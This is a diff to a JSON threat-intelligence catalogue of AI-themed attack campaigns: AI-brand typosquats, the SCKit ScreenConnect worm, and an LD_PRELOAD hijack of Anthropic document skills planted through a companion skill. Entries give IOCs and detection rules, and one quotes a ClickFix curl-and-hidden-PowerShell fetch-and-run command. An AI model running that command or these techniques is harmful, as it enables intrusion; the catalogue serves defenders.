+          "name": "Suspicious Msiexec Quiet Install From Remote Location",
+          "format": "sigma",
+          "url": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_msiexec_install_remote.yml",
+          "notes": "Windows process creation. msiexec /i against a remote URL with a quiet flag. Matches the active ClickFix path msiexec /i .../m?id= /qn."
+        },
+        {
+          "name": "Windows MSIExec Remote Download",
+          "format": "splunk",
+          "url": "https://github.com/splunk/security_content/blob/develop/detections/endpoint/windows_msiexec_remote_download.yml",
+          "notes": "Windows endpoint. msiexec retrieving a remote package. Same active delivery path."
+        },
+        {
+          "name": "Remotely Hosted HTA File Executed Via Mshta.EXE",
+          "format": "sigma",
+          "url": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_mshta_http.yml",
+          "notes": "Windows process creation. mshta.exe with an http URL. Matches the earlier /h?id= path that fetched GUP.exe and libcurl.dll."
+        },
+        {
+          "name": "Potential DLL Sideloading Of Libcurl.DLL Via GUP.EXE",
+          "format": "sigma",
+          "url": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/image_load/image_load_side_load_gup_libcurl.yml",
+          "notes": "Windows image load. GUP.exe loading libcurl.dll. SOCRadar assigns this to the previous HTA ZIP, not the current MSI."
+        },
+        {
+          "name": "Suspicious Execution of Powershell with Base64",
+          "format": "sigma",
+          "url": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_encode.yml",
+          "notes": "Windows process creation. Encoded PowerShell. Phantom53 CMD_EXEC runs powershell -EncodedCommand."
+        },
+        {
+          "name": "Bypass UAC via Fodhelper.exe",
+          "format": "sigma",
+          "url": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_uac_bypass_fodhelper.yml",
+          "notes": "Windows process creation. fodhelper.exe UAC bypass, which SOCRadar lists as a payload alias."
+        },
+        {
+          "name": "Local Scheduled Task Creation",
+          "format": "elastic",
+          "url": "https://github.com/elastic/detection-rules/blob/main/rules/windows/persistence_local_scheduled_task_creation.toml",
+          "notes": "Windows. New scheduled task. The MSI registers beacon and watcher tasks. Elevated installs use COM ITaskFolder::RegisterTask and do not spawn schtasks.exe."
+        },
+        {
+          "name": "Windows Scheduled Task Created Via XML",
+          "format": "splunk",
+          "url": "https://github.com/splunk/security_content/blob/develop/detections/endpoint/windows_scheduled_task_created_via_xml.yml",
+          "notes": "Windows. Task registration from XML. SOCRadar says the non-elevated path writes p53_task_a.xml and p53_task_b.xml."
+        },
+        {
+          "name": "pythonw, DoH, and Level RMM",
+          "format": "guidance",
+          "notes": "No cited rule names pythonw.exe loading cv2.pyd from AppData, DoH POST to 1.1.1.1, 8.8.8.8, or 76.76.2.11, or the Level RMM MSI. The schtasks.exe creation rule is not cited because the elevated path does not spawn schtasks.exe. Also hunt 145.63.138.67 and 185.224.132.148."
+        }
+      ],
+      "timeline": {
+        "first_seen": "2025-10",
+        "last_updated": "2026-11-13",
+        "updates": [
+          {
+            "date": "2025-10",
+            "source": "SOCRadar",
+            "summary": "Operators test malware and Cloudflare infrastructure. Development continues through early 2026."
+          },
+          {
+            "date": "2026-08",
+            "source": "SOCRadar",
+            "summary": "XaocMail phishing launches. The operation is still active at publication."
+          },
+          {
+            "date": "2026-11-13",
+            "source": "SOCRadar",
+            "summary": "STRU publishes the XaocMail, Phantom53, and HavoX chain, including the Claude Code task files and 145.63.138.67"
+          }
+        ]
+      }
+    },
+    {
+      "id": "island-typoprompting-ai-typosquats-2026-11",
+      "name": "Island TypoPrompting turns AI-brand typos into ClickFix, Net Guard, and search hijacks",
+      "date_reported": "2026-11-12",
+      "date_activity_start": "2025-04",
+      "date_activity_end": "2026-11-03",
+      "researcher": "Oleg Zaytsev",
+      "org": "Island",
+      "sources": [
+        {
+          "url": "https://www.island.io/blog/typoprompting-from-ai-typos-to-malware",
+          "title": "TypoPrompting: From AI Typos to Malware",
+          "publisher": "Island"
+        }
+      ],
+      "magicsword_coverage": [],
+      "borderline": false,
+      "borderline_note": null,
+      "ai_role": "ai_tool_as_lure",
+      "ai_role_secondary": null,
+      "ai_role_detail": "Lookalike domains for AI products send visitors into ClickFix, a Store-signed browser hijacker, or a search-hijack extension. The AI products are the lure, not the operator.",
+      "technique_summary": "Island (Oleg Zaytsev, Nov 12, 2026) traced 186 lookalike domains across 27 AI brands, including Claude, ChatGPT, DeepSeek, Perplexity, Midjourney, ElevenLabs, and Cursor. A Nov 3, 2026 snapshot connected cloude.ai to a Windows ClickFix command and eight AI typos to an installer funnel. A Windows scan of cloude.ai went through xml.securetrackingnode.com/click to biomimicrydevtech.buzz (flow_id=81, bid about 0.0065 to 0.009) and then a random subdomain of blockchainfuturedev.buzz, which fingerprinted the browser and served a fake Cloudflare check. The recovered command was cmd /c curl.exe -fsL --ssl-no-revoke --retry 8 saving %TEMP%\\W901.ps1 from 3112851459/985, then powershell -w h -nop -ep bypass -File that script. 3112851459 is 185.138.88.3 as a decimal integer. Pivoting the gate script hash found 550 scan records across 211 entry domains from April 2025 through November 2026, including lookalikes of banks, insurers, and enterprise software, plus Windows, macOS curl-to-zsh, and archive lures. Eight typos, including ckaude.ai, deepceek.com, copiot.com, elevenlebs.io, and vocie.ai, went through deezyj.com to fake Security Check pages that installed Net Guard, a Microsoft Store-signed Tauri app (publisher Myflixly App, product id 9MX3CH3BQ44Q, package family MyflixlyApp.NetGuard_k6q889pad57pt, analyzed 1.0.9.0). Island says the MSIX matches the Store hash and that buntai-sdk can change the default search engine, run JavaScript through DevTools Runtime.evaluate, and edit browser profiles. The same SDK is in Privacy Keeper 1.0.10.0 and MyFlixly Browser 1.0.10.0. The installer funnel spans 191 lander domains. preplexity.ai went to quickflashtool.com and a Chrome extension that sets the default search provider to find.flashysearches.com. It is one of 30 extensions from the same kit. Thirteen had been removed. The 17 still listed showed 972,000 declared users in total on November 3. Island says Socket's Oct 29, 2026 Searchjacked research lists 22 of the 30. An 81-domain portfolio including about 23 AI lookalikes ties to a11.click. Link anyrun-fake-ai-tools-2026-10.",
+      "initial_access": "A mistyped AI domain is handed to a traffic-distribution system that selects a ClickFix command, a Store installer, or an extension page",
+      "ai_tooling_and_models": [
+        "Lookalike domains for Claude, ChatGPT, DeepSeek, Perplexity, Cursor, and 22 other AI brands"
+      ],
+      "other_tooling": [
+        "curl.exe and hidden PowerShell (LOLBAS)",
+        "Net Guard / buntai-sdk Microsoft Store package",
+        "Chrome search-override extensions"
+      ],
+      "victims_and_sectors": "People trying to reach AI tools. The wider gate also used lookalikes of banks, insurers, and enterprise software. No named victim organizations.",
+      "regions": [
+        "Multiple regions"
+      ],
+      "attribution_or_cluster": "Unnamed. Island ties an 81-domain portfolio to a11.click and shared affiliate keys. No country is stated.",
+      "scale_and_metrics": "186 lookalike domains, 27 AI brands, in the Nov 3, 2026 snapshot. 211 entry domains on the ClickFix gate. 972,000 declared users across 17 still-listed search extensions on Nov 3. Net Guard funnel about 1,437 source domains.",
+      "prevention_angle": "Publish managed bookmarks for approved AI services. Alert when curl.exe writes a .ps1 and PowerShell starts with -w h and -ep bypass, including decimal hosts such as 3112851459. Do not treat a Microsoft Store signature as a reason to allow Net Guard package family MyflixlyApp.NetGuard_k6q889pad57pt. Enforce a managed search provider and block the extension IDs below.",
+      "related_magicsword_projects": [
+        "LOLBAS"
+      ],
+      "source_notes": "Counts, the ClickFix command, decimal IP 3112851459, package identifiers, and the 972,000-user figure are from Island. The article's appendix lists more lookalikes than the IOC set below. Link anyrun-fake-ai-tools-2026-10. Historical payloads on chatlgpt.com, midj0urney.org, and deepsek.icu are included only as Island states them.",
+      "last_reviewed": "2026-11-15",
+      "region_notes": "Island does not name victim countries. The traffic system uses the visitor's country to pick a lure, which is not a target-region list.",
+      "iocs": {
+        "domains": [
+          "cloude.ai",
+          "preplexity.ai",
+          "xml.securetrackingnode.com",
+          "biomimicrydevtech.buzz",
+          "blockchainfuturedev.buzz",
+          "deezyj.com",
+          "netguardsite.com",
+          "netguardprotect.com",
+          "a11.click",
+          "quickflashtool.com",
+          "find.flashysearches.com",
+          "ckaude.ai",
+          "deepceek.com",
+          "copiot.com",
+          "elevenlebs.io",
+          "vocie.ai"
+        ],
+        "ips": [
+          "185.138.88.3"
+        ],
+        "hashes": [
+          "bdddb50204d6867b4bd73d9cfe93cbc98c4518342da104e4608f04e675ac6cb3",
+          "a052b63e9c358c8911c17d1f58cce00949791f103fcf74f6057863d681c52301",
+          "51d577c84e50657d6cacf0e7738c9539ee4f39f76838423c682ad0dadc8e2d87"
+        ],
+        "urls": []
+      },
+      "atlas_techniques": [
+        {
+          "id": "AML.T0052",
+          "rationale": "Mistyped AI domains are the lure that leads to a command, an installer, or an extension",
+          "source_urls": [
+            "https://www.island.io/blog/typoprompting-from-ai-typos-to-malware"
+          ]
+        },
+        {
+          "id": "AML.T0050",
+          "rationale": "The Windows route copies a curl.exe and PowerShell command that the visitor is asked to run",
+          "source_urls": [
+            "https://www.island.io/blog/typoprompting-from-ai-typos-to-malware"
+          ]
+        }
+      ],
+      "attack_flow": {
+        "nodes": [
+          {
+            "id": "typo",
+            "title": "AI-brand typo loads",
+            "description": "A lookalike such as cloude.ai or preplexity.ai is served instead of the intended AI product. A parking page hands the browser to a traffic-distribution system.",
+            "kind": "access",
+            "source_urls": [
+              "https://www.island.io/blog/typoprompting-from-ai-typos-to-malware"
+            ]
+          },
+          {
+            "id": "clickfix",
+            "title": "Fake Cloudflare check copies a command",
+            "description": "The Windows route copies a curl.exe download of W901.ps1 from decimal host 3112851459 and a hidden PowerShell launch.",
+            "kind": "execution",
+            "source_urls": [
+              "https://www.island.io/blog/typoprompting-from-ai-typos-to-malware"
+            ]
+          },
+          {
+            "id": "netguard",
+            "title": "Store-signed Net Guard",
+            "description": "Other typos install the real Microsoft Store Net Guard package, whose buntai-sdk can change search settings and run DevTools scripts.",
+            "kind": "impact",
+            "source_urls": [
+              "https://www.island.io/blog/typoprompting-from-ai-typos-to-malware"
+            ]
+          },
+          {
+            "id": "extension",
+            "title": "Search-hijack extension",
+            "description": "preplexity.ai leads to an unlisted Chrome extension that sets the default search provider to find.flashysearches.com.",
+            "kind": "impact",
+            "source_urls": [
+              "https://www.island.io/blog/typoprompting-from-ai-typos-to-malware"
+            ]
+          }
+        ],
+        "edges": [
+          {
+            "source": "typo",
+            "target": "clickfix"
+          },
+          {
+            "source": "typo",
+            "target": "netguard"
+          },
+          {
+            "source": "typo",
+            "target": "extension"
+          }
+        ]
+      },
+      "category": "adversary-use-of-ai",
+      "attribution": {
+        "actor_name": "Unnamed typosquat operators",
+        "motivation": "financially-motivated",
+        "attributed_by": "Island",
+        "confidence": "low"
+      },
+      "ai_involvement_confidence": "confirmed",
+      "detections": [
+        {
+          "name": "Suspicious Curl.EXE Download",
+          "format": "sigma",
+          "url": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_curl_susp_download.yml",
+          "notes": "Windows process creation. curl.exe download. Matches the ClickFix command that saves W901.ps1. The decimal host 3112851459 is not a dotted IP, so a dotted-IP-only rule would miss it."
+        },
+        {
+          "name": "Potential File Transfer via Curl for Windows",
+          "format": "elastic",
+          "url": "https://github.com/elastic/detection-rules/blob/main/rules/windows/command_and_control_tool_transfer_via_curl.toml",
+          "notes": "Windows endpoint. curl.exe retrieving a remote file. Same ClickFix download, followed by powershell -w h -nop -ep bypass."
+        },
+        {
+          "name": "Decimal host, Net Guard, and search override",
+          "format": "guidance",
+          "notes": "No cited rule encodes 3112851459, -w h -ep bypass, the Net Guard package family MyflixlyApp.NetGuard_k6q889pad57pt, or extension IDs lihnhjjcdlfdomjliljlommppbfacmbj and nlmpdomhofmjdidcghodlgneobojdjfm. A Store signature matching hash bdddb50204d6867b4bd73d9cfe93cbc98c4518342da104e4608f04e675ac6cb3 is the package Island analyzed, not a clean verdict."
+        }
+      ],
+      "timeline": {
+        "first_seen": "2025-04",
+        "last_updated": "2026-11-12",
+        "updates": [
+          {
+            "date": "2025-04",
+            "source": "Island",
+            "summary": "Earliest matching records in the wider gate-kit corpus. The kit later serves Windows, macOS, and archive lures."
+          },
+          {
+            "date": "2026-11-03",
+            "source": "Island",
+            "summary": "Research snapshot ties cloude.ai to the Windows ClickFix command and counts 186 AI lookalikes across 27 brands. Seventeen search extensions still listed show 972,000 users."
+          },
+          {
+            "date": "2026-11-12",
+            "source": "Island",
+            "summary": "Oleg Zaytsev publishes TypoPrompting, including the decimal IP, Net Guard package identifiers, and the preplexity.ai extension path"
+          }
+        ]
+      }
+    },
     {
       "id": "unit42-cairn-cl-sta-1238-2026-11",
       "name": "Unit 42 CL-STA-1238 uses Cairn with Zhipu GLM and DeepSeek against semiconductor, defense, and civil-society targets",
@@ -182,6 +1032,206 @@
       "linked_tools": [
         "cairn"
       ]
+    },
+    {
+      "id": "huntress-sckit-screenconnect-llm-2026-11",
+      "name": "Huntress SCKit installs rogue ScreenConnect clients; RelayTrap source looks LLM-written",
+      "date_reported": "2026-11-11",
+      "date_activity_start": "2026-11-11",
+      "date_activity_end": "2026-11-13",
+      "researcher": "Ben Nahorney, Susannah Matt, Lindsey O'Donnell-Welch",
+      "org": "Huntress",
+      "sources": [
+        {
+          "url": "https://www.huntress.com/blog/sckit-worm-rogue-screenconnect",
+          "title": "SCKit Worm Installs Rogue ScreenConnect Clients and Session Cookie Relays Across Hundreds of Endpoints",
+          "publisher": "Huntress"
+        }
+      ],
+      "magicsword_coverage": [],
+      "borderline": false,
+      "borderline_note": null,
+      "ai_role": "llm_generated_malware",
+      "ai_role_secondary": null,
+      "ai_role_detail": "Huntress Figure 6 says the RelayTrap C# source appears to have been generated by an LLM, based on detailed comments that explain what the code is intended to do. No prompts were published.",
+      "technique_summary": "Huntress (Ben Nahorney, Susannah Matt, Lindsey O'Donnell-Welch; published Nov 11, 2026, updated Nov 13) observed Run commands on cloud-hosted ScreenConnect panels installing rogue ScreenConnect clients. On Nov 11, from about 17:47 UTC, at least 288 managed endpoints across 48 organizations were hit in about 90 minutes. ScreenConnect 26.6.6.9747 and 26.7.6.9783 were affected. Huntress ties the activity to the third-party RMM+ extension, versions 1.0.31 and 1.0.32: if the access key was never set, the extension accepted a blank key, bypassing ScreenConnect user accounts, roles, and MFA. Commands showed up as RMM+ with no matching login. ConnectWise said it had disabled five extensions (Labtech Plus, RMM Plus, RMM+, RMM Plus Password Link, and RMM+ Password Link) across more than 400 partner environments and had not yet identified an initial access vector when the Nov 11 advisory posted. The Run command, as SYSTEM, downloaded an attacker ScreenConnect installer to C:\\Windows\\TEMP\\sc.msi, installed it silently, and wrote C:\\Windows\\Temp\\sckit-run.bat. The dropper fetches sckit-decoder.ps1 and a kit keyed by the Windows UUID. Components extract to C:\\ProgramData\\RelayTrap. TrapWatch.ps1 runs as SYSTEM, compiles RelayTrap.cs into a host-specific RelayTrap.exe, and creates a scheduled task named TrapWatch that runs every 10 seconds. The legitimate ScreenConnect client is stopped and set to manual start. Huntress Figure 6 says the RelayTrap C# source appears to have been generated by an LLM because of detailed source comments explaining intent. A separate path, seen in the kit and not observed succeeding, steals the technician .aspxauth cookie with sqlite3.exe and tries to push WithUninstall.ps1 through the Shared Toolbox. On Nov 13 at 16:12 UTC Huntress saw another spike, 205 hosts across 41 organizations, with the client hosted at 185.241.211.197 and an installer URL ending in c=ExploitedNOTUSA. Huntress also saw c=Exploited529 and c=Exploited809. One incident used a self-hosted RMM+ plugin, a netsh portproxy from 127.0.0.1:88 to 185.241.211.197:80, and a service named Windows Update Agent running UpdateConnect.ClientService.exe from C:\\ProgramData\\Windows Update Agent (de362a425905bcc4)\\. ConnectWise also pointed on-premises partners at ScreenConnect 26.6.5 or later for CVE-2026-84869, a separate client file-transfer flaw. Primary panel indicators include sc.payproofkit.com (155.94.150.39) and 185.99.255.28.",
+      "initial_access": "Blank access key on RMM+ 1.0.31 or 1.0.32, then ScreenConnect Run Command as SYSTEM. ConnectWise had not identified a single initial-access vector in the Nov 11 advisory.",
+      "ai_tooling_and_models": [
+        "RelayTrap.cs, which Huntress says appears LLM-generated from its explanatory comments"
+      ],
+      "other_tooling": [
+        "ScreenConnect (LOLRMM), including rogue clients",
+        "RMM+ extension 1.0.31 and 1.0.32",
+        "sqlite3.exe for .aspxauth cookie theft",
+        "msiexec"
+      ],
+      "victims_and_sectors": "Organizations using Huntress and ScreenConnect. 48 organizations on Nov 11 and 41 on Nov 13. Sectors were not named.",
+      "regions": [
+        "unknown"
+      ],
+      "attribution_or_cluster": "Unnamed. Huntress and ConnectWise describe the activity. No country is stated. Participant name Addmin and client IDs 2588ef5c15954b10 and ed630cc2c873b091 were published.",
+      "scale_and_metrics": "Nov 11: at least 288 endpoints across 48 organizations in about 90 minutes. Nov 13: 205 hosts across 41 organizations. ConnectWise disabled the listed extensions across more than 400 partner environments. One panel parameter reached Exploited809 (190 downstream clients on one panel).",
+      "prevention_angle": "Disable RMM+ 1.0.31 and 1.0.32 where the access key was left blank, including on-premises ScreenConnect. Do not triage a suspect host over ScreenConnect. Remove the rogue client service, the TrapWatch task, C:\\ProgramData\\RelayTrap, and sckit files under %TEMP%. Hunt msiexec installs of ScreenConnect.ClientSetup.msi or UpdateConnect.ClientSetup.msi with c=Exploited. Block 185.99.255.28 and 185.241.211.197.",
+      "related_magicsword_projects": [
+        "LOLRMM"
+      ],
+      "source_notes": "Counts, the blank-key behavior, Figure 6's LLM comment, paths, and IOCs are from the Huntress article, including the Nov 13 update. The console-takeover and Shared Toolbox spread were recovered from the kit and were not seen succeeding. Additional acknowledged contributors include John Hammond, Tanner Filip, Tyler Marzen, Austin Worline, Ethan Williams, Sharon Martin, Ben Bernstein, Andrew Brandt, Jamie Levy, Max Rogers, Aaron Deal, and Mendy Green. File hashes are weak because scripts are rebuilt per host. CVE-2026-84869 is a separate ScreenConnect client issue that ConnectWise told partners to patch; Huntress does not say this wave exploited it.",
+      "last_reviewed": "2026-11-15",
+      "region_notes": "Huntress did not name the countries of the affected organizations.",
+      "iocs": {
+        "domains": [
+          "sc.payproofkit.com",
+          "newnewnew.gotdns.org",
+          "soxnewwork.homedns.org",
+          "cdn007-digitaldownloads.com",
+          "ns.mo7sen.dev",
+          "007.from-ak.com"
+        ],
+        "ips": [
+          "185.99.255.28",
+          "155.94.150.39",
+          "185.241.211.197"
+        ],
+        "hashes": [
+          "94b93c649b0ae0281352da9d01761fa9195ab1e6ac7010af3b9ba1646355eb11",
+          "7a9aca9fdd4dcc13fe497cabdb13ca1e5d6a529271c8aa495e5ca1c1c80271ec",
+          "3c7a98f0fdb6235b8076319c74dc1085f7b349b6d750416dd0cadb07d7972ec4",
+          "d2ed7a7bf4f8ac9c7969e9b3a07ebd4dda0d858f372c876ac0a041611698de9a",
+          "8cb5f48bbe70b5248db7f327f3d1ad6649df5c767d2a7e0711ee147fd92e06af"
+        ],
+        "urls": []
+      },
+      "atlas_techniques": [
+        {
+          "id": "AML.T0016.002",
+          "rationale": "Huntress says the RelayTrap C# source appears LLM-generated from comments that explain the intended behavior",
+          "source_urls": [
+            "https://www.huntress.com/blog/sckit-worm-rogue-screenconnect"
+          ]
+        },
+        {
+          "id": "AML.T0049",
+          "rationale": "RMM+ 1.0.31 and 1.0.32 accepted a blank access key and exposed Run Command as SYSTEM",
+          "source_urls": [
+            "https://www.huntress.com/blog/sckit-worm-rogue-screenconnect"
+          ]
+        }
+      ],
+      "attack_flow": {
+        "nodes": [
+          {
+            "id": "blank-key",
+            "title": "Blank RMM+ access key",
+            "description": "RMM+ 1.0.31 and 1.0.32 accept an empty access key when none was configured, so Run Command arrives without a ScreenConnect login.",
+            "kind": "access",
+            "source_urls": [
+              "https://www.huntress.com/blog/sckit-worm-rogue-screenconnect"
+            ]
+          },
+          {
+            "id": "install",
+            "title": "SYSTEM installs sc.msi and SCKit",
+            "description": "The command writes C:\\Windows\\TEMP\\sc.msi and sckit-run.bat, then downloads a UUID-keyed kit into C:\\ProgramData\\RelayTrap.",
+            "kind": "execution",
+            "source_urls": [
+              "https://www.huntress.com/blog/sckit-worm-rogue-screenconnect"
+            ]
+          },
+          {
+            "id": "relaytrap",
+            "title": "LLM-commented RelayTrap",
+            "description": "TrapWatch.ps1 compiles RelayTrap.cs, which Huntress says looks LLM-written, and schedules TrapWatch every 10 seconds.",
+            "kind": "ai",
+            "source_urls": [
+              "https://www.huntress.com/blog/sckit-worm-rogue-screenconnect"
+            ]
+          },
+          {
+            "id": "spread",
+            "title": "Cookie theft path not seen succeeding",
+            "description": "The kit can read a technician .aspxauth cookie with sqlite3.exe and upload a Shared Toolbox item. Huntress had not seen that jump succeed.",
+            "kind": "impact",
+            "source_urls": [
+              "https://www.huntress.com/blog/sckit-worm-rogue-screenconnect"
+            ]
+          }
+        ],
+        "edges": [
+          {
+            "source": "blank-key",
+            "target": "install"
+          },
+          {
+            "source": "install",
+            "target": "relaytrap"
+          },
+          {
+            "source": "relaytrap",
+            "target": "spread"
+          }
+        ]
+      },
+      "category": "adversary-use-of-ai",
+      "attribution": {
+        "actor_name": "Unnamed SCKit operator",
+        "motivation": "cybercrime",
+        "attributed_by": "Huntress",
+        "confidence": "low"
+      },
+      "ai_involvement_confidence": "vendor-asserted",
+      "detections": [
+        {
+          "name": "Remote Access Tool - ScreenConnect Installation Execution",
+          "format": "sigma",
+          "url": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_remote_access_tools_screenconnect_installation_cli_param.yml",
+          "notes": "Windows process creation. ScreenConnect client install command line. Matches msiexec of sc.msi and the Nov 13 UpdateConnect.ClientSetup.msi."
+        },
+        {
+          "name": "Remote Access Tool - ScreenConnect Remote Command Execution",
+          "format": "sigma",
+          "url": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_remote_access_tools_screenconnect_remote_execution.yml",
+          "notes": "Windows process creation. Commands launched from a ScreenConnect session. Matches the Run Command that deployed SCKit as SYSTEM."
+        },
+        {
+          "name": "Suspicious ScreenConnect Client Child Process",
+          "format": "elastic",
+          "url": "https://github.com/elastic/detection-rules/blob/main/rules/windows/command_and_control_screenconnect_childproc.toml",
+          "notes": "Windows endpoint. A ScreenConnect client spawning a suspicious child, including the installer and script chain."
+        },
+        {
+          "name": "Newly Observed ScreenConnect Host Server",
+          "format": "elastic",
+          "url": "https://github.com/elastic/detection-rules/blob/main/rules/windows/command_and_control_newly_observed_screenconnect_host_server.toml",
+          "notes": "Windows endpoint. A ScreenConnect client calling a host not seen before. Useful for 185.99.255.28 and 185.241.211.197."
+        },
+        {
+          "name": "Local Scheduled Task Creation",
+          "format": "elastic",
+          "url": "https://github.com/elastic/detection-rules/blob/main/rules/windows/persistence_local_scheduled_task_creation.toml",
+          "notes": "Windows. New scheduled task. The kit creates TrapWatch, which runs every 10 seconds as SYSTEM."
+        },
+        {
+          "name": "SCKit paths and the blank RMM+ key",
+          "format": "guidance",
+          "notes": "No cited rule names RMM+ 1.0.31, TrapWatch, C:\\ProgramData\\RelayTrap, or sckit-run.bat. ScreenConnect path-traversal rules describe CVE-class bugs, not the blank access key, so they are not cited. Also hunt sqlite3.exe reading ScreenConnect cookies and c=Exploited in the installer URL."
+        }
+      ],
+      "timeline": {
+        "first_seen": "2026-11-11",
+        "last_updated": "2026-11-13",
+        "updates": [
+          {
+            "date": "2026-11-11",
+            "source": "Huntress",
+            "summary": "From 17:47 UTC, Run Command installs SCKit on at least 288 endpoints across 48 organizations. ConnectWise disables five extensions, including RMM+."
+          },
+          {
+            "date": "2026-11-13",
+            "source": "Huntress",
+            "summary": "A second wave at 16:12 UTC hits 205 hosts across 41 organizations from 185.241.211.197, including c=ExploitedNOTUSA"
+          }
+        ]
+      }
     },
     {
       "id": "kaspersky-citrus-ransomware-llm-2026-11",
@@ -2688,6 +3738,344 @@
             "date": "2026-11-06",
             "source": "WorkOS",
             "summary": "WorkOS update clarifies incident as unintended ARTEX benchmark agent sandbox escape; researcher came forward, data deleted; independent forensics validates; UAs, IPs, and JA4s published"
+          }
+        ]
+      }
+    },
+    {
+      "id": "air-office-party-anthropic-skills-ld-preload-2026-11",
+      "name": "AIR Office Party, Anthropic document skills load an unchecked LD_PRELOAD library",
+      "date_reported": "2026-11-05",
+      "date_activity_start": "2026-05",
+      "researcher": "Omri Saxena, Or Nevo",
+      "org": "Air Security",
+      "sources": [
+        {
+          "url": "https://www.air.security/blog-posts/office-party",
+          "title": "Office Party: Anthropic's Document Skills Load an Unchecked Shared Library",
+          "publisher": "Air Security"
+        },
+        {
+          "url": "https://github.com/anthropics/skills/blob/main/skills/docx/scripts/office/soffice.py",
+          "title": "skills/docx/scripts/office/soffice.py",
+          "publisher": "anthropics"
+        }
+      ],
+      "magicsword_coverage": [],
+      "borderline": true,
+      "borderline_note": "Air Security published a proof of concept. The article does not describe in-the-wild exploitation. Anthropic acknowledged the report and said the helper only runs inside a sandbox, which Anthropic treats as outside its security boundary.",
+      "ai_role": "ai_agent_or_mcp_as_target",
+      "ai_role_secondary": null,
+      "ai_role_detail": "The official Anthropic docx, pptx, and xlsx skills call scripts/office/soffice.py. If a Unix socket cannot be opened, that helper sets LD_PRELOAD to whatever file is already at the temp-directory path lo_socket_shim.so.",
+      "technique_summary": "Air Security (Omri Saxena and Or Nevo; article dated Nov 5, 2026) found the issue in May 2026 and reported it to Anthropic. The docx, pptx, and xlsx skills, used by Claude document features and by the Claude Code document-skills marketplace, convert documents with python scripts/office/soffice.py --headless --convert-to pdf. The docx skill renders every written document to PDF through that helper. The same helper is used by the pptx and xlsx skills. If the helper cannot open a Unix socket, including under a sandbox, seccomp, or EMFILE, it sets LD_PRELOAD to a path under the process temp directory, lo_socket_shim.so, and execs LibreOffice. The helper does not check who owns that file or what is in it. Whoever writes it first is loaded into the LibreOffice process. Air's proof of concept planted the library directly in a Claude Code sandbox temp directory, and a second proof used a companion skill that unpacked the .so into /tmp while the agent wrote marketing copy. The load is Linux-only. macOS ignores LD_PRELOAD, so the library is not loaded there. Air writes that Anthropic acknowledged the report and considers the behavior outside its security boundary because the helper runs in a sandbox. As of the Nov 5 article, scripts/office/soffice.py on the repository main branch was unchanged since July 17 and still loaded the file at that path. A check of the same file on Nov 15, 2026 still showed _SHIM_SO built from tempfile.gettempdir() joined with lo_socket_shim.so, an early return when that file exists, and env[\"LD_PRELOAD\"] set to it.",
+      "initial_access": "A local writer places lo_socket_shim.so in the temp directory before the document skill runs soffice.py. Air demonstrated a direct plant and a companion skill. No remote exploitation is described.",
+      "ai_tooling_and_models": [
+        "Anthropic skills repository, skills/docx, skills/pptx, and skills/xlsx (https://github.com/anthropics/skills)",
+        "Claude Code document-skills and Claude document features that call soffice.py"
+      ],
+      "other_tooling": [
+        "LD_PRELOAD of lo_socket_shim.so",
+        "LibreOffice via soffice.py"
+      ],
+      "victims_and_sectors": "Users of the official Anthropic document skills on Linux, including Claude Code sandboxes where the socket open fails. No victim organizations are named.",
+      "regions": [
+        "Not applicable"
+      ],
+      "attribution_or_cluster": "No threat actor. Air Security reported the behavior in the official skill. Anthropic's response, as quoted by Air, is that the helper is outside Anthropic's security boundary.",
+      "scale_and_metrics": "One helper shared by the docx, pptx, and xlsx skills. No exploitation count was published.",
+      "prevention_angle": "Pin document skills and review scripts/office/soffice.py before enabling them. On Linux, alert when a process sets LD_PRELOAD to lo_socket_shim.so, and when a compiler writes that filename under /tmp before soffice.py runs. Do not treat an /etc/ld.so.preload file rule as coverage for this env-var path. macOS does not honor LD_PRELOAD for this load.",
+      "related_magicsword_projects": [
+        "LOLSkills"
+      ],
+      "source_notes": "The May 2026 discovery, the Nov 5, 2026 article date, Anthropic's sandbox response, and the July 17 unchanged claim are from Air Security. The Nov 15, 2026 file check is a read of https://github.com/anthropics/skills/blob/main/skills/docx/scripts/office/soffice.py. The pptx and xlsx helpers were not re-read on that date; Air says they share this helper.",
+      "last_reviewed": "2026-11-15",
+      "region_notes": "No target geography. The behavior is in published skill code.",
+      "iocs": {
+        "domains": [],
+        "ips": [],
+        "hashes": [],
+        "urls": []
+      },
+      "atlas_techniques": [
+        {
+          "id": "AML.T0010.001",
+          "rationale": "The load is in the official Anthropic document skills, not a third-party copy",
+          "source_urls": [
+            "https://www.air.security/blog-posts/office-party",
+            "https://github.com/anthropics/skills/blob/main/skills/docx/scripts/office/soffice.py"
+          ]
+        },
+        {
+          "id": "AML.T0053",
+          "rationale": "The docx skill invokes soffice.py as part of rendering a document the agent just wrote",
+          "source_urls": [
+            "https://www.air.security/blog-posts/office-party"
+          ]
+        }
+      ],
+      "attack_flow": {
+        "nodes": [
+          {
+            "id": "helper",
+            "title": "Document skill calls soffice.py",
+            "description": "docx, pptx, and xlsx skills run scripts/office/soffice.py --headless --convert-to pdf. The docx skill does this for every document it writes.",
+            "kind": "ai",
+            "source_urls": [
+              "https://www.air.security/blog-posts/office-party"
+            ]
+          },
+          {
+            "id": "preload",
+            "title": "Failed socket sets LD_PRELOAD",
+            "description": "If the Unix socket cannot be opened, soffice.py sets LD_PRELOAD to tempfile.gettempdir()/lo_socket_shim.so with no ownership or content check.",
+            "kind": "execution",
+            "source_urls": [
+              "https://www.air.security/blog-posts/office-party",
+              "https://github.com/anthropics/skills/blob/main/skills/docx/scripts/office/soffice.py"
+            ]
+          },
+          {
+            "id": "plant",
+            "title": "First writer of the shim is loaded",
+            "description": "Air planted the library in a Claude Code sandbox temp directory, and also unpacked it from a companion skill. Linux loads it. macOS ignores LD_PRELOAD.",
+            "kind": "impact",
+            "source_urls": [
+              "https://www.air.security/blog-posts/office-party"
+            ]
+          }
+        ],
+        "edges": [
+          {
+            "source": "helper",
+            "target": "preload"
+          },
+          {
+            "source": "preload",
+            "target": "plant"
+          }
+        ]
+      },
